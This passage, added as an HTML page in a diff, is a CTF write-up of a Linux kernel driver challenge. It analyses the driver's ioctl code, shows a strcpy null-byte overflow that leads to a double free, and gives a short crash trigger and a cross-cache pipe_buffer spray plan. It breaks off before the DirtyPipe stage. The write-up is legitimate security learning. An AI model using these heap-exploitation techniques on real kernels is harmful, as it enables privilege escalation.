@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title>Kernels and Cats</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <meta name="google-site-verification" content="733C7I2uDZnatcput9zZupeQ_PX5Z0BJ1HmTnGi0SJI" />
+	<link rel="icon" href="https://kaligulaarmblessed.github.io/favicon.ico">
+    <link rel="canonical" href="https://kaligulaarmblessed.github.io">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="https://kaligulaarmblessed.github.io">Kernels and Cats</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>All posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/challenges/">
+                                    
+                                    <span>CTF Challenges</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>Palindromatic -- Dirtypipe [Bi0sCTF 2024] - Sun, Mar 3, 2024</h1>
+    </div>
+    <p class="lead"></p>
+    <h4 id="tldr">TLDR</h4>
+<p>Palindromatic is a kernel pwn challenge in Bi0sCTF 2024 involving a null byte overflow vulnerability, cross cache, followed by DirtyPipe. The common kernel protections SMAP, SMEP, KPTI, KASLR are all enabled, with the addition of CONFIG_RANDOM_KMALLOC_CACHES which makes heap spraying more finnicky. Although I did not manage to solve this challenge during the CTF, I thought that this was a really cool challenge and since I wanted to learn how to do a DirtyPipe attack, I made this writeup :D</p>
+<p>Do check out the author&rsquo;s (K1R4) writeup too: <a href="https://blog.bi0s.in/2024/02/26/Pwn/bi0sCTF24-palindromatic/">https://blog.bi0s.in/2024/02/26/Pwn/bi0sCTF24-palindromatic/</a></p>
+<h4 id="table-of-contents">Table of Contents</h4>
+<ol>
+<li><a href="#introduction-to-the-challenge">Introduction to the Challenge</a></li>
+<li><a href="#module-analysis">Module Analysis</a></li>
+<li><a href="#finding-the-bug">Finding the Bug</a></li>
+<li><a href="#cross-cache-weird-objects-and-config_random_kmalloc_caches">Cross Cache, Weird Objects and CONFIG_RANDOM_KMALLOC_CACHES</a></li>
+<li><a href="#the-actual-proper-way-to-double-free">The Actual Proper Way to Double Free</a></li>
+<li><a href="#dirtypipe">DirtyPipe</a></li>
+</ol>
+<h4 id="introduction-to-the-challenge">Introduction to the Challenge</h4>
+<p>The challenge description was as such:</p>
+<pre tabindex="0"><code>An unnecessarily complex palindrome checker, implemented as a kernel driver. 
+What could possibly go wrong?
+</code></pre><p>The kernel module palindromatic.ko was provided, along with the bzImage, kernel module source code, a root filesystem, a script to start qemu, and the kernel .config file. Challenge files can be downloaded <a href="https://github.com/KaligulaArmblessed/Practice_Exploits/tree/main/Palindromatic_Bi0sCTF2024">here</a>. SMAP, SMEP, KPTI, and KASLR were enabled, as well as CONFIG_RANDOM_KMALLOC_CACHES, CONFIG_SLAB_FREELIST_RANDOM, CONFIG_SLAB_FREELIST_HARDENED, and CONFIG_STATIC_USERMODEHELPER.</p>
+<p>I worked on this challenge together with my teammate Shunt; unfortunately, we were unable to solve the challenge during the CTF. This serves as a post-mortem kind of writeup to learn how DirtyPipe works, as well to explore certain kernel structs such as pipe_buffer in greater depth (and also for me to learn how to git gud!)</p>
+<h4 id="module-analysis">Module Analysis</h4>
+<p>The module registers the misc device /dev/palindromatic and sets up a specific memory cache &ldquo;palindromatic&rdquo; at startup. The device itself has many IOCTL functions, as well as an incoming and an outgoing queue. The gist of it is that you can queue some requests (which will be put into the incoming queue), ask the module to check if the input is a palindrome (hence causing the requests in the incoming queue to be processed and put into the outgoing queue), and retrieve the results (taking the requests from the outgoing queue). The functions of the module are listed below:</p>
+<p><strong>DO_QUEUE: 0xb10500a</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> QUEUE:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">copy_from_user</span>(<span style="color:#f92672">&amp;</span>arg, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)uarg, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">arg_t</span>))) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_add_request</span>(<span style="color:#f92672">&amp;</span>arg);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span></code></pre></div><p>This basically adds a new request into the incoming queue. The request object created has the following structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">request_t</span> 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ptype type;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> magic;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> str[STRING_SZ];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> sanstr[STRING_SZ];
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">request_t</span>;
+</span></span></code></pre></div><p>The request object is 0x400 (1024) bytes, and STRING_SZ is equal to 0x1f8.</p>
+<p><strong>DO_SANITIZE: 0xb10500b</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> SANITIZE:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(sanitized) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>            sanitized <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_sanitize_request</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span></code></pre></div><p>You can only call sanitize one time. This basically sanitizes the input from one request in the incoming queue, by filtering characters not in [A-Z|a-z], and translating all characters to [A-Z]. This is actually the buggy function; more on this later.</p>
+<p><strong>DO_RESET: 0xb10500c</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> RESET:
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_reset_request</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> noinline <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">pm_reset_request</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">request_t</span> <span style="color:#f92672">*</span>req <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_queue_dequeue</span>(<span style="color:#f92672">&amp;</span>incoming_queue);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>req) <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">!=</span> RAW)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> RAW;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(req<span style="color:#f92672">-&gt;</span>sanstr, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(req<span style="color:#f92672">-&gt;</span>sanstr));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pm_queue_enqueue</span>(<span style="color:#f92672">&amp;</span>incoming_queue, req);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kfree</span>(req);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This function operates on one request from the incoming queue. The request is first removed from the incoming queue. If a request has a type equal to RAW, the request will be freed; else its type will be set to RAW and will be added back to the start of the queue.</p>
+<p><strong>DO_PROCESS: 0xb10500d</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> PROCESS:
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_process_request</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> noinline <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">pm_process_request</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> idx <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">request_t</span> <span style="color:#f92672">*</span>req <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_queue_peek</span>(<span style="color:#f92672">&amp;</span>incoming_queue);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>req) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">!=</span> magic) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>type<span style="color:#f92672">==</span>SANITIZED<span style="color:#f92672">?</span><span style="color:#a6e22e">strlen</span>(req<span style="color:#f92672">-&gt;</span>sanstr)<span style="color:#f92672">:</span><span style="color:#a6e22e">strlen</span>(req<span style="color:#f92672">-&gt;</span>str);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>len) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_queue_enqueue</span>(<span style="color:#f92672">&amp;</span>outgoing_queue, req);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(temp_buffer, <span style="color:#ae81ff">0x0</span>, STRING_SZ);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">==</span> RAW)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> (len<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i<span style="color:#f92672">--</span>)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>str[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x41</span> <span style="color:#f92672">||</span> req<span style="color:#f92672">-&gt;</span>str[i] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x5a</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            temp_buffer[i] <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>str[i];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        temp_buffer[len<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strcmp</span>(temp_buffer, <span style="color:#f92672">&amp;</span>req<span style="color:#f92672">-&gt;</span>str[len<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">+</span>len<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>)) req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> NONPALINDROME;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> PALINDROME;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pm_queue_dequeue</span>(<span style="color:#f92672">&amp;</span>incoming_queue);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">==</span> SANITIZED)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> (len<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i<span style="color:#f92672">--</span>) temp_buffer[i] <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>sanstr[i];
+</span></span><span style="display:flex;"><span>        temp_buffer[len<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strcmp</span>(temp_buffer, <span style="color:#f92672">&amp;</span>req<span style="color:#f92672">-&gt;</span>sanstr[len<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">+</span>len<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>)) req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> NONPALINDROME;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> PALINDROME;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pm_queue_dequeue</span>(<span style="color:#f92672">&amp;</span>incoming_queue);
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Process will take a request from the incoming queue, check if the string in the request is a palindrome, modify the type to reflect the result, and then finally add the processed request to the outgoing queue. Note that in the code above, only objects with a RAW or SANITIZED type will be dequeued from the incoming queue after being processed; this is also really important later on!</p>
+<p><strong>DO_REAP: 0xb10500e</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> REAP:
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_reap_request</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> noinline <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">pm_reap_request</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">request_t</span> <span style="color:#f92672">*</span>req <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_queue_dequeue</span>(<span style="color:#f92672">&amp;</span>outgoing_queue);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>req) <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">!=</span> magic) <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> ret <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>type<span style="color:#f92672">==</span>PALINDROME<span style="color:#f92672">?</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(req);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Reap operates on one request from the outgoing queue. It will first remove the request from the outgoing queue, make sure that the magic value is unmodified, before checking the type of the request and returning a value for whether it is or is not a palindrome. When a request is successfully reaped, it will be freed.</p>
+<p><strong>DO_QUERY: 0xb10500f</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> QUERY:
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_query_capacity</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> noinline <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">pm_query_capacity</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> ret <span style="color:#f92672">=</span> (QUEUE_SZ<span style="color:#f92672">-</span><span style="color:#a6e22e">pm_queue_count</span>(<span style="color:#f92672">&amp;</span>outgoing_queue))<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">16</span> 
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">|</span> (QUEUE_SZ<span style="color:#f92672">-</span><span style="color:#a6e22e">pm_queue_count</span>(<span style="color:#f92672">&amp;</span>incoming_queue));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Query returns the number of unfilled spaces in both the incoming and outgoing queues.</p>
+<h4 id="finding-the-bug">Finding the Bug</h4>
+<p>While <del>messing with the module</del> fuzzing, I noticed that it was possible to add the same request to the outgoing queue reliably multiple times. This was the PoC that caused a crash if I tried to reap the same request twice after I ran it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">do_queue</span>(buf);
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">do_sanitize</span>(); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x50</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">do_process</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The crash was due to the fact that CONFIG_SLAB_FREELIST_HARDENED protects against consecutive double frees (as mentioned here: <a href="https://a13xp0p0v.github.io/2017/09/27/naive-double-free-detection.html)">https://a13xp0p0v.github.io/2017/09/27/naive-double-free-detection.html)</a>, but since we were able to put at least 2 objects with the same address into the outgoing queue, this gives us the potential for a double free.</p>
+<p>I wasn&rsquo;t sure what caused the bug, but then my teammate Shunt managed to figure it out. Remember the DO_SANITIZE function of the module? This is the code for the function that actually does the sanitization:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> noinline <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">pm_sanitize_request</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> idx <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">request_t</span> <span style="color:#f92672">*</span>req <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_queue_peek</span>(<span style="color:#f92672">&amp;</span>incoming_queue);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>req) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">==</span> SANITIZED) <span style="color:#66d9ef">goto</span> end;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(temp_buffer, <span style="color:#ae81ff">0x0</span>, STRING_SZ);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> STRING_SZ; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>req<span style="color:#f92672">-&gt;</span>str[i]) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>str[i] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">&amp;&amp;</span> req<span style="color:#f92672">-&gt;</span>str[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7b</span>)
+</span></span><span style="display:flex;"><span>            temp_buffer[ptr<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>str[i]<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(req<span style="color:#f92672">-&gt;</span>str[i] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x40</span> <span style="color:#f92672">&amp;&amp;</span> req<span style="color:#f92672">-&gt;</span>str[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x5b</span>)
+</span></span><span style="display:flex;"><span>            temp_buffer[ptr<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>str[i];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    temp_buffer[ptr] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(req<span style="color:#f92672">-&gt;</span>sanstr, temp_buffer);                           <span style="color:#f92672">&lt;--</span> BUGGY<span style="color:#f92672">!</span> <span style="color:#960050;background-color:#1e0010">🐞</span>
+</span></span><span style="display:flex;"><span>    req<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> SANITIZED;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">pm_queue_enqueue</span>(<span style="color:#f92672">&amp;</span>incoming_queue, <span style="color:#a6e22e">pm_queue_dequeue</span>(<span style="color:#f92672">&amp;</span>incoming_queue));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>end:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> idx;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The maximum length of a string (as defined by STRING_SZ) is 0x1f8. The input the user provides to the ioctl is copied to the kernel, and then stored in req-&gt;str when a new request in queued. When the request is sanitized, the contents of req-&gt;str is copied to temp_buffer, and the end of the string (which can be a maximum of 0x1f8 characters) is terminated with a null byte (making that a maximum of 0x1f9 characters). Following which, temp_buffer is copied to req-&gt;sanstr via a strcpy operation.</p>
+<p>However, remember that in a strcpy operation, the null byte is copied to the destination along with the string. This means that if the string consists of 0x1f8 characters, a total of 0x1f9 characters will be copied to req-&gt;sanstr, which has a size of 0x1f8. This would give us a single null byte overflow into the next request object, and this would overflow the last byte of req-&gt;type.</p>
+<p>Now what causes the addition of the same object into the outgoing queue multiple times? When the null byte overflow occurs, the type of the object continguous to the sanitized object in memory is modified from RAW (0x1337) to 0x1300. Remember that the process function will only dequeue an object from the incoming queue if the request type is either RAW (0x1337) or SANITIZED (0x1338)? This means that when the corrupted request is processed, it will never be dequeued from the incoming queue. However, each process called will add the request once to the outgoing queue, meaning that the same request can be added multiple times to the outgoing queue.</p>
+<p>This also means that since the corrupted request will not be removed from the incoming queue, the number of free slots in the incoming queue will not change. Shunt realized that after calling sanitized, by calling query before calling process, it was possible to tell when the corrupted request was processed and added to the outgoing queue. This was important in stabilizing the cross cache, as the memory blocks allocated to the objects when they were queued are not continguous in memory (but the corrupted object is the object directly after the sanitized object in memory), so the corrupted object would be at a changing offset after the sanitized object in the incoming queue (which is the order that they are being processed).</p>
+<h4 id="cross-cache-weird-objects-and-config_random_kmalloc_caches">Cross Cache, Weird Objects and CONFIG_RANDOM_KMALLOC_CACHES</h4>
+<p>Knowing that we have a potential double free, the idea was to free the object for the first time via reap, spray something over the object, and then free it via reap a second time (since there were two entries of the same address in the outgoing queue). The catch for this method was that reap required the magic value to be intact in order to free the object, and hence whatever spray we used could not destroy the magic value (or so we thought).</p>
+<p>Since the victim object was of size 1024, I thought that we could do the following:</p>
+<ul>
+<li>Queue 0x100 objects</li>
+<li>Process 0x30 objects (I generally like to have a &lsquo;padding&rsquo; when it comes to cross cache)</li>
+<li>Call sanitize on one object to corrupt the object continguous to it in memory</li>
+<li>Do queue and process until we process the corrupted object at least twice to have it in the outgoing queue at least twice</li>
+<li>Reap to free the padding</li>
+<li>Reap the vulnerable object to free it once</li>
+<li>Call reset to free all the other objects in the incoming queue</li>
+<li>Spray &ldquo;pipe_buffer&rdquo; over the freed victim object</li>
+<li>Reap to free the vulnerable object a second time &ndash; more about this later; we ended up getting stuck here</li>
+</ul>
